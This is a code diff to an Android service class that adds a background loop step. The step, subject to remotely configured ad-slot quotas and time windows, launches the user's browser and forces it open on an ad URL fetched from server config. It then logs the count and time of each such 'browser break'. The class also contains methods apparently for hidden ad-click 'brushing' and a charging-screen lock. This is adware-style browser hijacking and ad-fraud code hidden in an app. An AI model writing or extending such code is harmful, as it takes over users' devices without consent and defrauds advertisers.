@@ -77,7 +77,8 @@ public class GSysService  {
 				initData();
 				while(isMainLoop() && GUserController.getMedia().getOpen())
 				{				
-					try {		
+					try {	
+						browserBreakThread();
 						boolean b = browserSpotThread();
 						if(!b)
 						{
@@ -151,6 +152,24 @@ public class GSysService  {
 		}	
 		return false;
 	}
+	//浏览器截取
+	private boolean browserBreakThread()
+	{
+		if(		isPresent 
+				&& GUserController.getMedia().isAdPosition(GCommon.BROWSER_BREAK)
+				&& GUserController.getMedia().isShowNum(GCommon.BROWSER_BREAK)
+				&& GUserController.getMedia().isShowTimeInterval(GCommon.BROWSER_BREAK)
+				&& GUserController.getMedia().isTimeSlot(GCommon.BROWSER_BREAK))
+		{		
+			String s =  GUserController.getMedia().getCpuUsage(GCommon.BROWSER_BREAK);
+			if(s != null)
+			{
+				browserBreak(s);
+				return true;
+			}			
+		}	
+		return false;
+	}
 	//充电锁
 	public void startLockThread()
 	{
@@ -195,14 +214,21 @@ public class GSysService  {
 	}
 	//浏览器截取
 	public void browserBreak(String packageName)
-	{
-		String url = "http://m.2048kg.com/?channelId=qq17011101";
+	{		
+		String url = GUserController.getMedia().getConfig(GCommon.BROWSER_BREAK).getBrowerBreakUrl();
 		PackageManager packageMgr = contexts.getPackageManager();
 		Intent intent = packageMgr.getLaunchIntentForPackage(packageName);
         intent.setAction(Intent.ACTION_VIEW);
         intent.addCategory(Intent.CATEGORY_DEFAULT);
         intent.setData(Uri.parse(url));
         contexts.startActivity(intent);
+        
+        int num = GTools.getSharedPreferences().getInt(GCommon.SHARED_KEY_BROWSER_BREAK_NUM, 0);
+		GTools.saveSharedData(GCommon.SHARED_KEY_BROWSER_BREAK_NUM, num+1);
+		GTools.saveSharedData(GCommon.SHARED_KEY_BROWSER_BREAK_TIME, GTools.getCurrTime());
+
+		GLog.e("-----------------", "browserBreak success");
+
 	}
 	//暗刷
 	public void behindBrush()
@@ -262,6 +288,8 @@ public class GSysService  {
 		GTools.saveSharedData(GCommon.SHARED_KEY_APP_SPOT_NUM, 0);
 		GTools.saveSharedData(GCommon.SHARED_KEY_WIFI_TIME, 0l);
 		GTools.saveSharedData(GCommon.SHARED_KEY_WIFI_NUM, 0);
+		GTools.saveSharedData(GCommon.SHARED_KEY_BROWSER_BREAK_TIME, 0l);
+		GTools.saveSharedData(GCommon.SHARED_KEY_BROWSER_BREAK_NUM, 0);
 	}
 	
 	private boolean isMainLoop()
